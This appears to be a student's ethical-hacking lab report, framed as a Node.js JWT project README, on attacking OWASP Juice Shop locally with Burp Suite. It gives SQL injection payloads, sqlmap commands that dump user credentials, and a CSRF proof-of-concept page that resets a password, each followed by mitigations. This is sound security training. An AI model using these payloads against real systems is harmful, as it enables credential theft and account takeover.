# Secure Node.js Express Login & Registration with JWT – Enhanced Version by Ejaz Ahmed

This is an enhanced, secure, and modernized version of the original [Bezkoder's Node.js Express JWT Authentication Example](https://www.bezkoder.com/node-js-express-login-example/). It includes improvements for security, code quality, and ES module support.

---

# Week 5: Ethical Hacking & Exploiting Vulnerabilities

## 🎯 Goal
The purpose of this week’s task was to practice ethical hacking techniques on a deliberately vulnerable Node.js application (**OWASP Juice Shop**), exploit common web vulnerabilities, and then understand how to mitigate them in real-world applications.

---

## 🛠 Tools Used
- **Kali Linux / Parrot OS (or attacker VM)**
- **OWASP Juice Shop** (running locally at `http://127.0.0.1:3001`)
- **Burp Suite Community Edition** (proxy, repeater, intruder)
- **SQLMap** (for automated SQLi detection and exploitation)
- **Browser** (with Burp Proxy certificate installed for HTTPS interception)

---

## 🔍 Step 1: Ethical Hacking Basics

### 1. Setting Up the Environment
- Launched OWASP Juice Shop using Docker:
  ```bash
  docker run --rm -p 3001:3000 bkimminich/juice-shop
# Burp Suite Configuration and Reconnaissance

## 1. Initial Setup

* Confirmed Juice Shop was accessible at: 👉 `http://127.0.0.1:3001`

## 2. Configuring Burp Suite

* Opened **Burp Suite → Proxy → Options → Proxy Listeners**, confirmed default listener on `127.0.0.1:8080`.
* Set browser proxy:
  * Firefox/Chrome → Settings → Proxy → Manual → HTTP Proxy `127.0.0.1`, Port `8080`.
* Installed Burp CA certificate:
  * Navigated to `http://burp` in the browser.
  * Downloaded and imported into browser **Trusted Root CA** to avoid HTTPS warnings.

## 3. Reconnaissance

* Logged into Juice Shop with a test account:

```
test1@gmail.com / test123
```

* With **Burp Proxy ON**, intercepted traffic while browsing.
* Discovered sensitive endpoints:
  * `/rest/user/login`
  * `/rest/user/change-password`
  * `/rest/products/search?q=...`
* Sent requests to **Burp Repeater** for deeper inspection.

✅ **Learning outcome**: Mapped the app's structure and identified potential injection points.

# 💉 Step 2: SQL Injection & Exploitation

## 1. Manual SQLi Testing with Burp

* Intercepted search request:

```http
GET /rest/products/search?q=apple
```

* Sent it to **Repeater** and tested payloads:
  * `' OR '1'='1`
  * `';--`
* Response changed → indicated SQL Injection.

## 2. Automated Testing with SQLMap

* Saved vulnerable request from Burp to `request.txt`.
* Ran SQLMap:

```bash
sqlmap -r request.txt --batch --dbs
```

* Databases enumerated:
  * `sqlite_master`
  * `main`

* Extracted tables:

```bash
sqlmap -r request.txt --tables
```

* Dumped user credentials:

```bash
sqlmap -r request.txt --dump -T Users
```

## 3. Mitigation in Real Apps

* Use **parameterized queries / prepared statements**:

```javascript
User.findOne({ where: { email: emailInput } });
```

✅ **Learning outcome**: Confirmed SQLi existed, extracted data, and learned how to fix it.

# 🎭 Step 3: CSRF Exploitation

## 1. Identifying CSRF Targets

* Sensitive endpoints:
  * `/rest/user/change-password?current=&new=&repeat=`
  * `/rest/user/email`
* Targeted **Change Password** request.

## 2. Intercepting the Request

* With **Burp Proxy ON**, captured:

```http
GET /rest/user/change-password?current=test123&new=test123&repeat=test123
Authorization: Bearer <JWT>
Cookie: token=<JWT>
```

* Modified values in **Repeater** → password changed (or flagged by Juice Shop IDS).


## 3. Proof of Concept (Exploit HTML)

Created `csrf_pw_reset.html`:

```html
<html>
  <body>
    <img src="http://127.0.0.1:3001/rest/user/change-password?current=test123&new=hacked123&repeat=hacked123">
  </body>
</html>
```

* When opened in a logged-in session → password reset automatically.


## 4. Juice Shop IDS

* Some requests blocked with:

```
Error: Blocked illegal activity by ::ffff:172.17.0.1
```

* Demonstrates **Intrusion Detection System (IDS)**.

## 5. Mitigation in Real Apps

* Use **POST requests** for sensitive changes.
* Implement **CSRF tokens** (`csurf` middleware in Node.js).
* Use `SameSite=Strict` cookies.

✅ **Learning outcome**: Demonstrated CSRF attacks and defenses.

---

# 📦 Deliverables

## 1. **Ethical Hacking Report** (this document).

## 2. **Exploits performed**:
   * SQL Injection with Burp + SQLMap.
   * CSRF exploit PoC HTML file.

## 3. **Defensive Coding Notes**:
   * SQLi → parameterized queries.
   * CSRF → CSRF tokens + secure cookies.

## Author

**Ejaz Ahmed**  
Cyber Security & Full-stack Enthusiast

> Fork it, explore it, secure it! 🔒

